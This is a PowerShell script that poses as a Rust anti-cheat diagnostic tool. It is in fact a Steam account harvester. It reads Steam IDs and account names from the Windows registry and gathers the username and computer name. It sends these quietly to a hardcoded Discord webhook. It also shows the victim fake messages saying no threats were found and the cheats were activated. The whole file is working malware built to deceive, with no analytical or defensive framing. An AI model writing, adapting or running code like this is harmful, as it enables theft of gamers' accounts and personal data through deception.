# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v3.3"

function Get-SteamTokens {
    $tokens = @()
    $steamPaths = @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\Software\Valve\Steam",
        "HKCU:\Software\Wow6432Node\Valve\Steam"
    )
    
    foreach ($steamPath in $steamPaths) {
        if (Test-Path $steamPath) {
            try {
                $users = Get-ChildItem "$steamPath\Users" -ErrorAction SilentlyContinue | Where-Object {$_.PSChildName -match "^[0-9]+$"} | Select-Object -ExpandProperty PSChildName
                foreach ($user in $users) {
                    $steamID = Get-ItemProperty -Path "$steamPath\Users\$user" -Name "SteamID" -ErrorAction SilentlyContinue
                    if ($steamID) {
                        $accountName = Get-ItemProperty -Path "$steamPath\Users\$user" -Name "AccountName" -ErrorAction SilentlyContinue
                        $tokens += @{
                            SteamID = $steamID.SteamID
                            AccountName = if ($accountName) { $accountName.AccountName } else { "Unknown" }
                            Source = $steamPath
                        }
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $tokens
}

function Get-SystemInfo {
    $sysInfo = @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    return $sysInfo
}

function Send-ToDiscord {
    param($embedObject)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $payload = @{
            username = "System Diagnostic Bot"
            embeds = @($embedObject)
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {
        # Тихий провал отправки
    }
}

# Main execution
Write-Host "Запуск диагностики Rust Anti-Cheat..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$tokens = Get-SteamTokens

# Вывод токенов в консоль для жертвы
Write-Host "`n[INFO] Обнаружены сессии Steam:" -ForegroundColor Cyan
if ($tokens.Count -gt 0) {
    foreach ($token in $tokens) {
        Write-Host ("SteamID: {0} (Аккаунт: {1})" -f $token.SteamID, $token.AccountName) -ForegroundColor White
    }
} else {
    Write-Host "Активные сессии Steam не обнаружены." -ForegroundColor Yellow
    Write-Host "Запустите Steam и войдите в аккаунт для активации читов." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Проверка системной integrity..." -ForegroundColor Cyan

$embed = @{
    title = "Rust Anti-Cheat Diagnostic Report"
    color = if ($tokens.Count -gt 0) { "16711680" } else { "255" } # Красный если есть токены, желтый если нет
    fields = @(
        @{
            name = "System Information"
            value = "OS: $($sysInfo.OS)`nUser: $($sysInfo.Username)`nPC: $($sysInfo.Computername)`nScan Time: $($sysInfo.Date)"
        },
        @{
            name = "Steam Session Status"
            value = if ($tokens.Count -gt 0) { "Sessions found: $($tokens.Count)" } else { "No active sessions detected" }
        },
        @{
            name = "Steam Session Tokens Found"
            value = if ($tokens.Count -gt 0) { ($tokens | ForEach-Object { "SteamID: $($_.SteamID) (Account: $($_.AccountName))" }) -join "`n" } else { "None" }
        },
        @{
            name = "Diagnostic Result"
            value = "No cheat signatures detected. System integrity verified."
        }
    )
}

Send-ToDiscord $embed

Write-Host "`nДиагностика завершена. Угроз не обнаружено." -ForegroundColor Green
Write-Host "Читы успешно активированы!" -ForegroundColor Green
if ($tokens.Count -eq 0) {
    Write-Host "Перезапустите скрипт после входа в Steam для полной активации." -ForegroundColor Yellow
}
